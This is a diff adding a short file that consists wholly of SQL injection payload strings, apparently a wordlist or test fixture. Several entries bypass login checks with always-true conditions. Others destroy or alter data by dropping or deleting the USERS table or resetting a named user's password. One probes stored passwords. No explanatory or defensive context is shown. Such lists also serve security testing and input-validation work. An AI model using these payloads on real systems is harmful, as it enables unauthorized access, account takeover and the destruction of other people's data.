@@ -1,0 +1,10 @@
+' OR EXISTS(DELETE FROM USERS) AND ''='
+' OR '1'='1
+'; DROP TABLE USERS; --
+'; DELETE FROM USERS; --
+' OR '1'='1'; --
+' OR '1'='1'; DELETE FROM users;--
+x' AND 1=(SELECT COUNT(*) FROM users); --
+x'; UPDATE users SET password = 'parola' WHERE name = 'jake'; --
+' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%_%') AND ''='
+' OR '1'='1'; DELETE FROM USERS; SELECT * FROM users WHERE name='jake
